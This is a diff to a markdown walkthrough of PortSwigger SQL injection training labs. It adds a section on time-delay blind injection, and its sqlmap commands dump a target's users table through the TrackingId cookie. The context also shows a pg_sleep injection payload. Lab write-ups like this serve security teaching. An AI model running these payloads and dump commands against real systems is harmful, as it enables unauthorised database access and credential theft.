@@ -15,6 +15,7 @@
 - [Blind SQL injection with conditional responses](#blind-sql-injection-with-conditional-responses)
 - [Blind SQL injection with conditional errors](#blind-sql-injection-with-conditional-errors)
 - [Blind SQL injection with time delays](#blind-sql-injection-with-time-delays)
+- [Blind SQL injection with time delays and information retrieval](#blind-sql-injection-with-time-delays-and-information-retrieval)
 
 ## SQL injection UNION attack, determining the number of columns returned by the query
 Reference: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
@@ -273,3 +274,20 @@ For this lab it is only needed to observe that the DB is vulnerable to SQL injec
 TrackingId=x'||pg_sleep(10)--
 ```
 3. Submit the request and observe that the application takes 10 seconds to respond.
+
+## Blind SQL injection with time delays and information retrieval
+Reference: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+
+<!-- omit in toc -->
+### Quick Solution
+As in the previous lab the Database is vulnerable to **SQL Injection with time delays**. We can use the following commands to exploit the lab:
+```
+# Enumerate tables
+docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 --dump
+# Dump the content of the users table
+docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dump
+```
+
+<!-- omit in toc -->
+### Solution
+The solution is **extremely long** and it has not been copied, see the reference link.
